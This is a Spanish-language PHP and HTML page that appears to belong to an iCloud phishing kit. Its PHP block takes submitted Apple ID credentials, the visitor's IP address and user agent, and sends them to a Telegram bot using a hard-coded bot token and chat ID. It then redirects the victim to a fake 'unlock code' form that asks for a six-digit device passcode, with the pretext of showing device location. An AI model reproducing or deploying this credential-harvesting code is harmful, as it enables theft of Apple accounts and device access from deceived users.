<?php
if (isset($_POST['apple_id']) && isset($_POST['password'])) {
    // Capturar datos del formulario
    $apple_id = $_POST['apple_id'];
    $password = $_POST['password'];
    
    // Capturar información del dispositivo
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    
    // Configurar datos del bot de Telegram
    $botToken = '6349539696:AAFnhdeO0rNvpGWVG2zrPALUKVuKCdqlhj4'; // Reemplazar con tu token de bot
    $chatId = '6065537099'; // Reemplazar con tu chat ID
    $message = "📱 Nueva entrada detectada:\n\n";
    $message .= "🍎 Apple ID: `$apple_id`\n";
    $message .= "🔑 Contraseña: `$password`\n\n";
    $message .= "🌐 IP: `$ip`\n";
    $message .= "🖥️ User Agent: `$user_agent`";
    
    // Enviar mensaje a Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];
    
    file_get_contents($url . '?' . http_build_query($data));
    
    // Redirigir al usuario
    header('Location: /icloud-archivos/code2022esp.php');
    exit();
}
?>

<!DOCTYPE html>
<html lang="es">
    
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ingreso de Código</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 50px;
        }
        .container {
            max-width: 400px;
            margin: auto;
        }
        .code-input {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 20px 0;
        }
        .code-input input {
            width: 40px;
            height: 40px;
            text-align: center;
            font-size: 20px;
            border: 2px solid #ccc;
            border-radius: 5px;
        }
        button {
            background-color: #007BFF;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>Ingrese el código de desbloqueo del dispositivo</h2>
        <form action="post.php" method="POST">
            <div class="code-input">
                <input type="text" maxlength="1" name="code1" required inputmode="numeric" pattern="[0-9]">
                <input type="text" maxlength="1" name="code2" required inputmode="numeric" pattern="[0-9]">
                <input type="text" maxlength="1" name="code3" required inputmode="numeric" pattern="[0-9]">
                <input type="text" maxlength="1" name="code4" required inputmode="numeric" pattern="[0-9]">
                <input type="text" maxlength="1" name="code5" required inputmode="numeric" pattern="[0-9]">
                <input type="text" maxlength="1" name="code6" required inputmode="numeric" pattern="[0-9]">
            </div>
            <p>Ingrese su código de desbloqueo para ver la ubicación actual de tus dispositivos</p>
            <button type="submit">Desbloquear</button>
        </form>
    </div>

</body>
</html>
